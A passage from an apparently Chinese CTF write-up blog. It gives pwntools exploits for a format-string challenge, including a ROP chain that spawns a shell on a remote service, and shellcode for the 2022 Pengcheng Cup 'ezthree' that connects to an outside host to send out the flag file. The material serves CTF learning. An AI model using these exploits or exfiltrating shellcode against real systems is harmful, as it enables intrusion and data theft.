content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">script = <span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">if</span>(script):</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">p=process(elf_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">stack=<span class="built_in">int</span>(ru(<span class="string">b&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>)[-<span class="number">4</span>:],<span class="number">16</span>)-<span class="number">12</span></span><br><span class="line">leak(<span class="string">&quot;stack&quot;</span>,stack)</span><br><span class="line">dbg()</span><br><span class="line">payload=<span class="string">b&#x27;%p&#x27;</span>*<span class="number">9</span></span><br><span class="line">payload+=<span class="string">&quot;%&#123;&#125;c%hn&quot;</span>.<span class="built_in">format</span>(stack-<span class="number">90</span>).encode()</span><br><span class="line">written=stack&amp;<span class="number">0xff</span></span><br><span class="line"><span class="keyword">if</span> written&lt;=<span class="number">0x23</span>:</span><br><span class="line">n=<span class="number">0x23</span>-written</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">n=<span class="number">0x100</span>-written+<span class="number">0x23</span></span><br><span class="line">payload+=<span class="string">&quot;%&#123;&#125;c%39$hhn&quot;</span>.<span class="built_in">format</span>(n).encode()</span><br><span class="line">payload+=<span class="string">b&#x27;%9$p%13$p&#x27;</span></span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">r(<span class="number">90</span>)</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">libc.address=<span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>)-libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]-<span class="number">243</span></span><br><span class="line">leak(<span class="string">&quot;libc&quot;</span>,libc.address)</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">text=<span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x11a9</span></span><br><span class="line">leak(<span class="string">&quot;text:&quot;</span>,text)</span><br><span class="line"></span><br><span class="line">payload=</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><p>别人的<strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;/bin/tmux&quot;</span>,<span class="string">&quot;sp&quot;</span>,<span class="string">&quot;-h&quot;</span>]</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fmt</span>(<span class="params">sh, data</span>):</span><br><span class="line">    data = data.ljust(<span class="number">0x100</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    sh.send(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_data</span>(<span class="params">sh, atk_addr, write_data</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">build</span>(<span class="params">x</span>):</span><br><span class="line">        <span class="keyword">if</span> x == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;%&#123;&#125;c&quot;</span>.<span class="built_in">format</span>(x)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> target_addr <span class="keyword">in</span> <span class="built_in">range</span>(atk_addr, atk_addr + <span class="built_in">len</span>(write_data), <span class="number">2</span>):</span><br><span class="line">        idx = target_addr - atk_addr</span><br><span class="line">        part_data = u16(write_data[idx: idx + <span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">        payload = <span class="string">&quot;%&#123;&#125;c&quot;</span>.<span class="built_in">format</span>(main) + <span class="string">&quot;%39$hhn&quot;</span></span><br><span class="line">        payload += build((target_addr + <span class="number">0x10000</span> - main) &amp; <span class="number">0xFFFF</span>) + <span class="string">&quot;%27$hn&quot;</span></span><br><span class="line">        fmt(sh, payload)</span><br><span class="line"></span><br><span class="line">        payload = <span class="string">&quot;%&#123;&#125;c&quot;</span>.<span class="built_in">format</span>(main) + <span class="string">&quot;%39$hhn&quot;</span></span><br><span class="line">        payload += build((part_data + <span class="number">0x10000</span> - main) &amp; <span class="number">0xFFFF</span>) + <span class="string">&quot;%41$hn&quot;</span></span><br><span class="line">        fmt(sh, payload)</span><br><span class="line"></span><br><span class="line">main = <span class="number">0x23</span></span><br><span class="line">retn = <span class="number">0xC4</span></span><br><span class="line"><span class="comment"># sh = process(&#x27;./fmt&#x27;)</span></span><br><span class="line">sh = remote(sys.argv[<span class="number">1</span>], <span class="number">9999</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Gift: &#x27;</span>)</span><br><span class="line">stack_ret = <span class="built_in">int</span>(sh.recvline(), <span class="number">16</span>) - <span class="number">0xC</span></span><br><span class="line">log.success(<span class="string">&quot;stack_ret:\t&quot;</span> + <span class="built_in">hex</span>(stack_ret))</span><br><span class="line"></span><br><span class="line">first = <span class="string">&quot;%c&quot;</span> * <span class="number">9</span></span><br><span class="line">first += <span class="string">&quot;%&#123;&#125;c%hn&quot;</span>.<span class="built_in">format</span>((stack_ret-<span class="number">9</span>) &amp; <span class="number">0xFFFF</span>)</span><br><span class="line">first += <span class="string">&quot;%&#123;&#125;c%39$hhn&quot;</span>.<span class="built_in">format</span>((main - stack_ret) &amp; <span class="number">0xFF</span>)</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">fmt(sh, first)</span><br><span class="line"><span class="comment"># sh.interactive()</span></span><br><span class="line"></span><br><span class="line">fmt(sh, <span class="string">&quot;%&#123;&#125;c%39$hhn%9$p%11$p\n&quot;</span>.<span class="built_in">format</span>(main &amp; <span class="number">0xFF</span>))</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;0x&#x27;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>) - <span class="number">0x24083</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base:\t&quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">stack = <span class="built_in">int</span>(sh.recvline(), <span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&quot;stack:\t&quot;</span> + <span class="built_in">hex</span>(stack))</span><br><span class="line">stack_rop = stack - <span class="number">0x108</span></span><br><span class="line">pop_rdi_addr = libc_base + <span class="number">0x23b6a</span></span><br><span class="line">bin_sh_addr = libc_base + <span class="number">0x1b45bd</span></span><br><span class="line">system_addr = libc_base + <span class="number">0x52290</span></span><br><span class="line">write_data(sh, stack_rop, p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr))</span><br><span class="line">fmt(sh, <span class="string">&quot;%&#123;&#125;c&quot;</span>.<span class="built_in">format</span>(retn) + <span class="string">&quot;%39$hhn&quot;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="printf的一个细节问题"><a href="#printf的一个细节问题" class="headerlink" title="printf的一个细节问题"></a>printf的一个细节问题</h2><p>看两段代码</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%11$hn&quot;</span>.<span class="built_in">format</span>(stack).encode()</span><br><span class="line">written=stack&amp;<span class="number">0xff</span></span><br><span class="line"><span class="keyword">if</span> written&lt;=<span class="number">0x23</span>:</span><br><span class="line">n=<span class="number">0x23</span>-written</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">n=<span class="number">0x100</span>-written+<span class="number">0x23</span></span><br><span class="line">payload+=<span class="string">&quot;%&#123;&#125;c%39$hhn&quot;</span>.<span class="built_in">format</span>(n).encode()</span><br><span class="line">payload+=<span class="string">b&#x27;%9$p%13$p&#x27;</span></span><br><span class="line">s(payload)</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;%p&#x27;</span>*<span class="number">9</span></span><br><span class="line">payload+=<span class="string">&quot;%&#123;&#125;c%hn&quot;</span>.<span class="built_in">format</span>(stack-<span class="number">90</span>).encode()</span><br><span class="line">written=stack&amp;<span class="number">0xff</span></span><br><span class="line"><span class="keyword">if</span> written&lt;=<span class="number">0x23</span>:</span><br><span class="line">n=<span class="number">0x23</span>-written</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">n=<span class="number">0x100</span>-written+<span class="number">0x23</span></span><br><span class="line">payload+=<span class="string">&quot;%&#123;&#125;c%39$hhn&quot;</span>.<span class="built_in">format</span>(n).encode()</span><br><span class="line">payload+=<span class="string">b&#x27;%9$p%13$p&#x27;</span></span><br></pre></td></tr></table></figure><p>这两段代码的目的,都是两次连接修改来写printf的返回地址</p><p>且效果上看过去是一致的,但实际上第一段代码并不能按照预期工作,仅仅是修改了第一部分的指针，确实做出了一个指向 <code>printf</code> 返回地址的指针，但第二部分通过刚刚做出的指针并没有成功修改掉 <code>printf</code> 函数的返回地址</p><p>原理暂时不清楚,但得出的结论是,要像这样通过修改中间指针来指向修改某一个内存,连接过程不能两个都是用<code>$</code>写法,其中一个得是利用正常顺序排列得出</p><h3 id="非-格式化顺序"><a href="#非-格式化顺序" class="headerlink" title="非$格式化顺序"></a>非$格式化顺序</h3><p><strong>非$指定的%参数单独计数</strong>,按顺序对应各个参数</p><p>例如<code>printf(&quot;%d%2$d%d&quot;,1,2,3)</code></p><p>打印结果是122,即$不加入普通参数的记数</p><p>在本题中就选择以9个%p和1个%c填充,使得%hn对应相对格式化字符串的第11个参数</p><h1 id="2022鹏城杯-ezthree"><a href="#2022鹏城杯-ezthree" class="headerlink" title="2022鹏城杯-ezthree"></a>2022鹏城杯-ezthree</h1><p><strong>标签:socket</strong>本地进程间通信</p><p>这题感觉挺有意思,但怎么都找不到附件下载</p><p>不过好在程序很简单,直接就着别人的wp也勉强能行</p><p>保护是全部开启</p><p>前面的代码分析了一坨,结果发现最后压根用不上</p><p>真正有用的代码只有下面这段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(shellcode, <span class="number">0x90</span>, <span class="number">0x1000</span>uLL);</span><br><span class="line"><span class="keyword">if</span> ( LODWORD(s[<span class="number">5</span>]) )<span class="comment">//要满足这个条件只需要在开始输入的时候进行一些溢出即可</span></span><br><span class="line">&#123;</span><br><span class="line">  sub_E10(<span class="string">&quot;You want to do sometings ?\n&quot;</span>);</span><br><span class="line">  readshellcode((<span class="type">char</span> *)shellcode + <span class="number">4056</span>, <span class="number">40LL</span>);</span><br><span class="line">  close(<span class="number">0</span>);</span><br><span class="line">  close(<span class="number">1</span>);</span><br><span class="line">  close(<span class="number">2</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(shellcode, &amp;unk_203010, <span class="number">0x3D</span>uLL);</span><br><span class="line">  shellcode();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重点关注这串代码,先是读入shellcode然后关闭了标准流,导致没有任何输出</p><p>然后还会在shellcode处开始处移入这一串代码</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-03-11_194732.png" alt=""></p><p>这导致了除了rip以外所有的寄存器都被清空了,特别是rsp,这使得我们几乎无法正常运行有用的代码</p><p>这里可以利用到一个知识点fs寄存器存储着tls结构</p><p><strong>fs:[0x300]存储着一个栈指针</strong>,因此可以利用这个进行恢复rsp</p><p>之后利用mprotect修改栈权限,并在之前的输入中提前输入一些汇编代码,之后调试获得偏移就能执行更多代码了</p><p>但现在还有一个非常致命的问题,文件的所有流都被关闭了,这意味着无论是getshell还是orw都无法获得输出</p><p>因此这里用到了一个socket通信的技巧</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=remote(&#x27;114.116.233.171&#x27;,8888)</span></span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>,arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ret</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;code &gt; &quot;</span>,<span class="string">&quot;ret&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">zero</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;code &gt; &quot;</span>,<span class="string">&quot;zero&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nop</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;code &gt; &quot;</span>,<span class="string">&quot;nop&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">jmp</span>(<span class="params">addr</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;code &gt; &quot;</span>,<span class="string">&quot;jmp&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">movrax</span>(<span class="params">addr</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;code &gt; &quot;</span>,<span class="string">&quot;movrax&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p, &quot;b *$rebase(0x185E)&quot;)</span></span><br><span class="line"></span><br><span class="line">serv_addr = <span class="number">0x420001</span> <span class="comment"># serv_addr</span></span><br><span class="line"></span><br><span class="line">shellcode=asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov rax, 41</span></span><br><span class="line"><span class="string">mov rdi, 2</span></span><br><span class="line"><span class="string">mov rsi, 1</span></span><br><span class="line"><span class="string">mov rdx, 0</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">push 0</span></span><br><span class="line"><span class="string">mov rcx, 0xABE97472EE260002</span></span><br><span class="line"><span class="string">push rcx</span></span><br><span class="line"><span class="string">mov rsi, rsp</span></span><br><span class="line"><span class="string">xor rdi, rdi</span></span><br><span class="line"><span class="string">mov rax, 42</span></span><br><span class="line"><span class="string">mov rdx, 0x10</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">jmp $+0x32</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">shellcode+=<span class="string">&quot;b&quot;</span>*<span class="number">0x30</span></span><br><span class="line"></span><br><span class="line">shellcode+=asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">push 0x67616c66</span></span><br><span class="line"><span class="string">mov rax, 2</span></span><br><span class="line"><span class="string">xor rdx, rdx</span></span><br><span class="line"><span class="string">mov rdi, rsp</span></span><br><span class="line"><span class="string">xor rsi, rsi</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">xor rdi, rdi</span></span><br><span class="line"><span class="string">xchg rdi, rax</span></span><br><span class="line"><span class="string">mov rsi, rsp</span></span><br><span class="line"><span class="string">mov rdx, 0x50</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">xor rdi, rdi</span></span><br><span class="line"><span class="string">mov rax, 1</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">p.sendline(shellcode+<span class="string">&quot;a&quot;</span>*<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">shell=asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov rsp, fs:[0x300]</span></span><br><span class="line"><span class="string">push 0x1000</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">push 7</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">push 0xA</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">mov rdi, rsp</span></span><br><span class="line"><span class="string">and rdi, 0xFFFFFFFFFFFFF000</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">sub rsp,0x67</span></span><br><span class="line"><span class="string">jmp rsp</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.send(shell)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>再在服务器上监听对应的端口<code>nc -l 9988</code>,可见顺利接收到了flag</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/DKI55Y39LLRTHAEB@9BO%7DOX.png" alt=""></p><h2 id="socket通信"><a href="#socket通信" class="headerlink" title="socket通信"></a>socket通信</h2><p>只针对这题用到的客户端</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __sys_socket(<span class="type">int</span> family, <span class="type">int</span> type, <span class="type">int</span> protocol)</span><br></pre></td></tr></table></figure><p>第一个参数和第三个参数,协议族</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Supported address families. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_UNSPEC0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_UNIX1<span class="comment">/* Unix domain sockets */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_LOCAL1<span class="comment">/* POSIX name for AF_UNIX*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_INET2<span class="comment">/* Internet IP Protocol */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_AX253<span class="comment">/* Amateur Radio AX.25 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_IPX4<span class="comment">/* Novell IPX */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_APPLETALK5<span class="comment">/* AppleTalk DDP */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_NETROM6<span class="comment">/* Amateur Radio NET/ROM */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_BRIDGE7<span class="comment">/* Multiprotocol bridge */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_ATMPVC8<span class="comment">/* ATM PVCs*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_X259<span class="comment">/* Reserved for X.25 project */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_INET610<span class="comment">/* IP version 6*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_ROSE11<span class="comment">/* Amateur Radio X.25 PLP*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_DECnet12<span class="comment">/* Reserved for DECnet project*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_NETBEUI13<span class="comment">/* Reserved for 802.2LLC project*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_SECURITY14<span class="comment">/* Security callback pseudo AF */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_KEY15      <span class="comment">/* PF_KEY key management API */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_NETLINK16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_ROUTEAF_NETLINK <span class="comment">/* Alias to emulate 4.4BSD */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_PACKET17<span class="comment">/* Packet family*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_ASH18<span class="comment">/* Ash*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_ECONET19<span class="comment">/* Acorn Econet*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_ATMSVC20<span class="comment">/* ATM SVCs*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_RDS21<span class="comment">/* RDS sockets */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_SNA22<span class="comment">/* Linux SNA Project (nutters!) */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_IRDA23<span class="comment">/* IRDA sockets*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_PPPOX24<span class="comment">/* PPPoX sockets*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_WANPIPE25<span class="comment">/* Wanpipe API Sockets */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_LLC26<span class="comment">/* Linux LLC*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_IB27<span class="comment">/* Native InfiniBand address*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_MPLS28<span class="comment">/* MPLS */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_CAN29<span class="comment">/* Controller Area Network      */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_TIPC30<span class="comment">/* TIPC sockets*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_BLUETOOTH31<span class="comment">/* Bluetooth sockets */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_IUCV32<span class="comment">/* IUCV sockets*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_RXRPC33<span class="comment">/* RxRPC sockets */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_ISDN34<span class="comment">/* mISDN sockets */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_PHONET35<span class="comment">/* Phonet sockets*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_IEEE80215436<span class="comment">/* IEEE802154 sockets*/</span></span></span><br><span class="line"><span class="meta">#<span 